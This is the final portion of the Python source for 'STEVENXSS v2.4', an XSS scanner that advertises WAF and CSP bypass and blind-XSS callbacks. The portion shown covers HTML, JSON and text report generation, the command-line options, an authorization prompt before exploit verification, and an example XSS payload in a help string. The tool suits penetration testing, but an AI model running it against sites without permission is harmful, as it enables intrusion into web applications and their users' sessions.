        .hash {{ background: #e8f5e8; color: #2e7d32; }}
        .successful-payload {{ background: #d4edda; border-left: 4px solid #28a745; padding: 10px; margin: 5px 0; }}
        .exploit-success {{ background: #d1ecf1; border-left: 4px solid #17a2b8; padding: 15px; margin: 10px 0; }}
        .exploit-fail {{ background: #f8d7da; border-left: 4px solid #dc3545; padding: 15px; margin: 10px 0; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ STEVENXSS v2.4 Security Scan Report</h1>
            <p>Ultimate DOM XSS Scanner with Full XSS Support</p>
            <p><strong>Features:</strong> DOM XSS • Blind XSS • WAF Bypass • CSP Bypass • Location.Hash Exploitation</p>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <h3>Total Requests</h3>
                <p style="font-size: 24px; font-weight: bold; color: #007bff;">{self.stats['total_requests']}</p>
            </div>
            <div class="stat-card">
                <h3>Vulnerabilities Found</h3>
                <p style="font-size: 24px; font-weight: bold; color: #dc3545;">{self.stats['vulnerabilities_found']}</p>
            </div>
            <div class="stat-card">
                <h3>DOM Vulnerabilities</h3>
                <p style="font-size: 24px; font-weight: bold; color: #fd7e14;">{self.stats['dom_vulnerabilities']}</p>
            </div>
            <div class="stat-card">
                <h3>Location.Hash Vulns</h3>
                <p style="font-size: 24px; font-weight: bold; color: #28a745;">{self.stats['location_hash_vulnerabilities']}</p>
            </div>
            <div class="stat-card">
                <h3>Scan Duration</h3>
                <p style="font-size: 24px; font-weight: bold; color: #17a2b8;">{scan_duration:.2f}s</p>
            </div>
        </div>

        <div class="stats">
            <div class="stat-card">
                <h3>Successful Payloads</h3>
                <p style="font-size: 24px; font-weight: bold; color: #28a745;">{successful_report['total_successful']}</p>
            </div>
            <div class="stat-card">
                <h3>Overall Success Rate</h3>
                <p style="font-size: 24px; font-weight: bold; color: #17a2b8;">{successful_report['overall_success_rate']:.2f}%</p>
            </div>
            <div class="stat-card">
                <h3>Total Tested</h3>
                <p style="font-size: 24px; font-weight: bold; color: #6c757d;">{successful_report['total_tested']}</p>
            </div>
        </div>
"""
            
            # Add exploit statistics if any
            if self.stats['exploit_attempts'] > 0:
                exploit_success_rate = (self.stats['successful_exploits'] / self.stats['exploit_attempts'] * 100) if self.stats['exploit_attempts'] > 0 else 0
                html_report += f"""
        <div class="stats">
            <div class="stat-card">
                <h3>Exploit Attempts</h3>
                <p style="font-size: 24px; font-weight: bold; color: #ffc107;">{self.stats['exploit_attempts']}</p>
            </div>
            <div class="stat-card">
                <h3>Successful Exploits</h3>
                <p style="font-size: 24px; font-weight: bold; color: #28a745;">{self.stats['successful_exploits']}</p>
            </div>
            <div class="stat-card">
                <h3>Exploit Success Rate</h3>
                <p style="font-size: 24px; font-weight: bold; color: #17a2b8;">{exploit_success_rate:.1f}%</p>
            </div>
        </div>
"""
            
            html_report += """
        
        <h2>💥 Exploit Verification Results</h2>
"""
            
            exploit_results = [r for r in self.results if r.exploit_result]
            if exploit_results:
                for result in exploit_results:
                    if result.exploit_result.successful:
                        html_report += f"""
        <div class="exploit-success">
            <h3>✅ Exploit Successful - {result.parameter}</h3>
            <p><strong>Evidence:</strong> {html.escape(result.exploit_result.evidence)}</p>
            <p><strong>Execution Context:</strong> {result.exploit_result.execution_context}</p>
            <p><strong>Original Payload:</strong> <code class="payload">{html.escape(result.payload)}</code></p>
            {f'<p><strong>Screenshot:</strong> <a href="{result.exploit_result.screenshot_path}">{result.exploit_result.screenshot_path}</a></p>' if result.exploit_result.screenshot_path else ''}
        </div>
"""
                    else:
                        html_report += f"""
        <div class="exploit-fail">
            <h3>❌ Exploit Failed - {result.parameter}</h3>
            <p><strong>Error:</strong> {html.escape(result.exploit_result.error_message)}</p>
            <p><strong>Original Payload:</strong> <code class="payload">{html.escape(result.payload)}</code></p>
        </div>
"""
            else:
                html_report += """
        <div style="text-align: center; padding: 20px;">
            <p>No exploit verification was performed.</p>
        </div>
"""
            
            html_report += """
        
        <h2>✅ Successful Payloads</h2>
"""
            
            if successful_report['total_successful'] > 0:
                for i, payload_info in enumerate(successful_report['successful_payloads'][:50], 1):
                    html_report += f"""
        <div class="successful-payload">
            <h4>Payload #{i} (Success: {payload_info['success_rate']:.1f}%)</h4>
            <p><strong>Payload:</strong> <code class="payload">{html.escape(payload_info['payload'])}</code></p>
            <p><strong>Success Rate:</strong> {payload_info['success_count']}/{payload_info['total_tests']} ({payload_info['success_rate']:.1f}%)</p>
            <p><strong>Contexts:</strong> {', '.join(payload_info['contexts'])}</p>
        </div>
"""
            else:
                html_report += """
        <div style="text-align: center; padding: 20px;">
            <p>No successful payloads found in this scan.</p>
        </div>
"""
            
            html_report += """
        
        <h2>📋 Vulnerability Details</h2>
"""
            
            if self.results:
                for i, result in enumerate(self.results):
                    context_badges = "".join([
                        f'<span class="context-badge {result.context.value}">{result.context.value}</span>'
                    ])
                    
                    html_report += f"""
        <div class="vulnerability {result.level.value}">
            <h3>Vulnerability #{i+1} - <span style="color: {'#dc3545' if result.level == VulnerabilityLevel.CRITICAL else '#fd7e14' if result.level == VulnerabilityLevel.HIGH else '#ffc107' if result.level == VulnerabilityLevel.MEDIUM else '#28a745'}">{result.level.value.upper()}</span></h3>
            <p><strong>Parameter:</strong> {result.parameter}</p>
            <p><strong>Payload:</strong> <code class="payload">{html.escape(result.payload)}</code></p>
            <p><strong>Context:</strong> {context_badges}</p>
            <p><strong>Confidence:</strong> {result.confidence:.1f}%</p>
            <p><strong>URL:</strong> <code>{html.escape(result.url)}</code></p>
            <p><strong>HTTP Status:</strong> {result.http_status}</p>
            <p><strong>Timestamp:</strong> {result.timestamp}</p>
        </div>
"""
            else:
                html_report += """
        <div style="text-align: center; padding: 40px;">
            <h3 style="color: #28a745;">✅ No vulnerabilities detected</h3>
            <p>The target appears to have proper XSS protection measures in place.</p>
        </div>
"""
            
            html_report += """
    </div>
</body>
</html>
"""
            
            return html_report
        except Exception as e:
            return f"Error generating HTML report: {str(e)}"
    
    def _generate_json_report(self) -> str:
        """Generate JSON report"""
        try:
            successful_report = self.payload_engine.get_successful_payloads_report()
            
            report_data = {
                'metadata': {
                    'tool': 'STEVENXSS v2.4',
                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                    'scan_duration': self.get_scan_duration()
                },
                'statistics': self.stats,
                'successful_payloads_report': successful_report,
                'vulnerabilities': [
                    {
                        'parameter': r.parameter,
                        'payload': r.payload,
                        'context': r.context.value,
                        'level': r.level.value,
                        'confidence': r.confidence,
                        'url': r.url,
                        'http_status': r.http_status,
                        'timestamp': r.timestamp,
                        'exploit_result': {
                            'successful': r.exploit_result.successful if r.exploit_result else False,
                            'evidence': r.exploit_result.evidence if r.exploit_result else "",
                            'execution_context': r.exploit_result.execution_context if r.exploit_result else "",
                            'screenshot_path': r.exploit_result.screenshot_path if r.exploit_result else "",
                            'error_message': r.exploit_result.error_message if r.exploit_result else ""
                        } if r.exploit_result else None
                    }
                    for r in self.results
                ]
            }
            
            return json.dumps(report_data, indent=2, ensure_ascii=False)
        except Exception as e:
            return f'{{"error": "Report generation failed: {str(e)}"}}'
    
    def _generate_text_report(self) -> str:
        """Generate text report"""
        try:
            scan_duration = self.get_scan_duration()
            successful_report = self.payload_engine.get_successful_payloads_report()
            
            report = f"""
STEVENXSS v2.4 - Security Scan Report
=====================================

Scan Statistics:
----------------
• Total Requests: {self.stats['total_requests']}
• Vulnerabilities Found: {self.stats['vulnerabilities_found']}
• DOM Vulnerabilities: {self.stats['dom_vulnerabilities']}
• Location.Hash Vulnerabilities: {self.stats['location_hash_vulnerabilities']}
• Scan Duration: {scan_duration:.2f} seconds
• Successful Tests: {self.stats['successful_tests']}
• Exploit Attempts: {self.stats['exploit_attempts']}
• Successful Exploits: {self.stats['successful_exploits']}

Successful Payloads Report:
--------------------------
• Total Successful Payloads: {successful_report['total_successful']}
• Overall Success Rate: {successful_report['overall_success_rate']:.2f}%
• Total Tested Payloads: {successful_report['total_tested']}

Exploit Verification Results:
---------------------------
"""
            
            exploit_results = [r for r in self.results if r.exploit_result]
            if exploit_results:
                for result in exploit_results:
                    if result.exploit_result.successful:
                        report += f"""
✅ EXPLOIT SUCCESSFUL - {result.parameter}
   Evidence: {result.exploit_result.evidence}
   Execution Context: {result.exploit_result.execution_context}
   Screenshot: {result.exploit_result.screenshot_path}
"""
                    else:
                        report += f"""
❌ EXPLOIT FAILED - {result.parameter}
   Error: {result.exploit_result.error_message}
"""
            else:
                report += "\nNo exploit verification was performed.\n"
            
            report += """
Top Successful Payloads:
-----------------------
"""
            
            if successful_report['total_successful'] > 0:
                for i, payload_info in enumerate(successful_report['successful_payloads'][:20], 1):
                    report += f"""
{i:2d}. {payload_info['payload']}
     Success: {payload_info['success_count']}/{payload_info['total_tests']} ({payload_info['success_rate']:.1f}%)
     Contexts: {', '.join(payload_info['contexts'])}
"""
            else:
                report += "\nNo successful payloads found in this scan.\n"
            
            report += """
Vulnerabilities:
---------------
"""
            
            if self.results:
                for i, result in enumerate(self.results):
                    report += f"""
{i+1}. {result.level.value.upper()} - {result.parameter}
   Payload: {result.payload}
   Context: {result.context.value}
   Confidence: {result.confidence:.1f}%
   URL: {result.url}
   HTTP Status: {result.http_status}
   Timestamp: {result.timestamp}
"""
            else:
                report += "\nNo vulnerabilities detected.\n"
            
            return report
        except Exception as e:
            return f"Error generating text report: {str(e)}"

def parse_post_data(post_string: str) -> Dict:
    """Parse POST data from string"""
    if not post_string:
        return {}
    
    post_data = {}
    try:
        pairs = post_string.split('&')
        for pair in pairs:
            if '=' in pair:
                key, value = pair.split('=', 1)
                post_data[key] = urllib.parse.unquote(value)
        return post_data
    except Exception as e:
        DisplayManager.print_error(f"Error parsing POST data: {str(e)}")
        return {}

def load_custom_headers(headers_file: str) -> Dict:
    """Load custom headers from JSON file"""
    if not headers_file:
        return {}
    
    try:
        with open(headers_file, 'r') as f:
            return json.load(f)
    except Exception as e:
        DisplayManager.print_error(f"Error loading headers: {str(e)}")
        return {}

async def main():
    """Main function"""
    DisplayManager.print_banner()
    
    parser = argparse.ArgumentParser(description='STEVENXSS v2.4 - Ultimate DOM XSS Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL to scan')
    parser.add_argument('-f', '--file', required=True, help='Payload file path')
    parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'], help='HTTP method')
    parser.add_argument('-d', '--data', help='POST data (e.g., "param1=value1&param2=value2")')
    parser.add_argument('-H', '--headers', help='Custom headers JSON file')
    parser.add_argument('-t', '--threads', type=int, default=50, help='Max concurrent requests (default: 50)')
    parser.add_argument('-s', '--strategy', default='comprehensive', 
                       choices=['quick', 'comprehensive', 'waf_bypass', 'dom_focused', 'blind_xss', 'location_hash', 'csp_bypass', 'all'],
                       help='Scan strategy (default: comprehensive)')
    parser.add_argument('--no-dom', action='store_true', help='Disable DOM XSS analysis')
    parser.add_argument('--max-tests', type=int, help='Maximum number of tests to perform')
    parser.add_argument('--report-format', default='html', choices=['html', 'json', 'text'], help='Report format')
    parser.add_argument('--all', action='store_true', help='Use ALL options with maximum power (overrides other options)')
    parser.add_argument('--exploit', help='Perform exploit verification with specified payload (e.g., "<img src=x onerror=alert(1)>")')
    parser.add_argument('--blind-xss', action='store_true', help='Enable Blind XSS callback server')
    
    args = parser.parse_args()
    
    # Apply --all option
    if args.all:
        DisplayManager.print_section("MAXIMUM POWER MODE ACTIVATED")
        DisplayManager.print_warning("Using ALL options with maximum power configuration!")
        
        args.strategy = "all"
        args.threads = 100
        if not args.max_tests:
            args.max_tests = None
        args.blind_xss = True
        
        DisplayManager.print_info("Configuration:")
        DisplayManager.print_info(f"  • Strategy: {args.strategy}")
        DisplayManager.print_info(f"  • Threads: {args.threads}")
        DisplayManager.print_info(f"  • Max Tests: {'No limit' if not args.max_tests else args.max_tests}")
        DisplayManager.print_info(f"  • DOM Analysis: {'Enabled' if not args.no_dom else 'Disabled'}")
        DisplayManager.print_info(f"  • Blind XSS: {'Enabled' if args.blind_xss else 'Disabled'}")
    
    # Validate inputs
    if not os.path.exists(args.file):
        DisplayManager.print_error(f"Payload file not found: {args.file}")
        return
    
    # Ethical warning for exploit feature
    if args.exploit or args.all:
        DisplayManager.print_section("ETHICAL EXPLOIT VERIFICATION")
        DisplayManager.print_warning("⚠️  EXPLOIT FEATURE - AUTHORIZED USE ONLY  ⚠️")
        DisplayManager.print_warning("This feature is for authorized security testing only.")
        DisplayManager.print_warning("Unauthorized use against systems without permission is ILLEGAL.")
        DisplayManager.print_warning("You are responsible for ensuring you have proper authorization.")
        if args.exploit:
            DisplayManager.print_info(f"Exploit payload: {args.exploit}")
        
        # Confirm proceed
        try:
            response = input("\nDo you have authorization to test this target? (yes/NO): ").strip().lower()
            if response not in ['yes', 'y']:
                DisplayManager.print_error("Exploit verification cancelled. Authorization required.")
                return
        except KeyboardInterrupt:
            DisplayManager.print_error("Exploit verification cancelled by user.")
            return
    
    # Parse POST data and headers
    post_data = parse_post_data(args.data) if args.data else {}
    custom_headers = load_custom_headers(args.headers) if args.headers else {}
    
    # Initialize scanner
    scanner = STEVENXSSScanner(max_concurrency=args.threads)
    
    try:
        if not await scanner.initialize():
            return
        
        DisplayManager.print_section("SCAN STARTED")
        
        use_all_payloads = (args.strategy == "all" or args.all)
        
        results = await scanner.smart_scan(
            target_url=args.url,
            payloads_file=args.file,
            strategy=args.strategy,
            method=args.method,
            post_data=post_data,
            custom_headers=custom_headers,
            enable_dom=not args.no_dom,
            max_tests=args.max_tests,
            use_all_payloads=use_all_payloads,
            exploit_payload=args.exploit,
            enable_blind_xss=args.blind_xss
        )
        
        scanner.print_successful_payloads_report()
        
        report = scanner.generate_report(args.report_format)
        
        timestamp = int(time.time())
        report_file = f'stevenxss_report_{timestamp}.{args.report_format}'
        try:
            with open(report_file, 'w', encoding='utf-8') as f:
                f.write(report)
            DisplayManager.print_success(f"Report saved: {report_file}")
        except Exception as e:
            DisplayManager.print_error(f"Failed to save report: {str(e)}")
        
        scan_duration = scanner.get_scan_duration()
        DisplayManager.print_section("SCAN SUMMARY")
        print(f"{TerminalColors.GREEN}🎯 Total Vulnerabilities: {TerminalColors.WHITE}{len(results)}{TerminalColors.END}")
        print(f"{TerminalColors.YELLOW}🔍 DOM Vulnerabilities: {TerminalColors.WHITE}{scanner.stats['dom_vulnerabilities']}{TerminalColors.END}")
        print(f"{TerminalColors.CYAN}📍 Location.Hash Vulns: {TerminalColors.WHITE}{scanner.stats['location_hash_vulnerabilities']}{TerminalColors.END}")
        print(f"{TerminalColors.CYAN}⏱️  Scan Duration: {TerminalColors.WHITE}{scan_duration:.2f}s{TerminalColors.END}")
        print(f"{TerminalColors.MAGENTA}📊 Successful Tests: {TerminalColors.WHITE}{scanner.stats['successful_tests']}{TerminalColors.END}")
        print(f"{TerminalColors.BLUE}🚀 Strategy Used: {TerminalColors.WHITE}{args.strategy}{TerminalColors.END}")
        if args.all:
            print(f"{TerminalColors.RED}💥 Mode: {TerminalColors.WHITE}MAXIMUM POWER{TerminalColors.END}")
        if args.exploit or args.all:
            print(f"{TerminalColors.GREEN}💣 Exploit Attempts: {TerminalColors.WHITE}{scanner.stats['exploit_attempts']}{TerminalColors.END}")
            print(f"{TerminalColors.GREEN}✅ Successful Exploits: {TerminalColors.WHITE}{scanner.stats['successful_exploits']}{TerminalColors.END}")
        if args.blind_xss:
            print(f"{TerminalColors.MAGENTA}🔔 Blind XSS Callbacks: {TerminalColors.WHITE}{len(scanner.blind_xss.detected_callbacks) if scanner.blind_xss else 0}{TerminalColors.END}")
        
    except KeyboardInterrupt:
        DisplayManager.print_warning("Scan interrupted by user")
    except Exception as e:
        DisplayManager.print_error(f"Scan failed: {str(e)}")
    finally:
        await scanner.close()

if __name__ == "__main__":
    if os.path.exists('/etc/os-release'):
        with open('/etc/os-release', 'r') as f:
            if 'kali' in f.read().lower():
                DisplayManager.print_info("Kali Linux detected - Optimized configuration enabled")
    
    asyncio.run(main())

